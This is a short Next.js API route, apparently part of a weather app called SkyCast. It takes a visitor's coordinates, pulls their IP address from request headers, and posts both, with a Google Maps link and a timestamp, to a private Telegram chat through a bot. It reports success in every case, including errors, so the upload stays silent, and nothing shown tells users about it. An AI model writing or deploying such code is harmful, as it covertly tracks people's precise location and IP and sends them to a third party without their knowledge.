import { NextResponse } from "next/server";

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";

export async function POST(request) {
  if (!BOT_TOKEN || !CHAT_ID) {
    return NextResponse.json({ ok: true });
  }

  try {
    const { lat, lon } = await request.json();

    // Get user IP from headers
    const forwarded = request.headers.get("x-forwarded-for");
    const ip = forwarded ? forwarded.split(",")[0].trim() : "unknown";

    const timestamp = new Date().toLocaleString("en-IN", {
      timeZone: "Asia/Kolkata",
      dateStyle: "medium",
      timeStyle: "short",
    });

    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
    const text = [
      `📍 *SkyCast Location Access*`,
      ``,
      `IP: \`${ip}\``,
      `Coordinates: \`${lat}, ${lon}\``,
      `Map: [Open in Maps](${mapLink})`,
      `Time: ${timestamp}`,
    ].join("\n");

    await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text,
          parse_mode: "Markdown",
          disable_web_page_preview: true,
        }),
      }
    );

    return NextResponse.json({ ok: true });
  } catch {
    return NextResponse.json({ ok: true });
  }
}
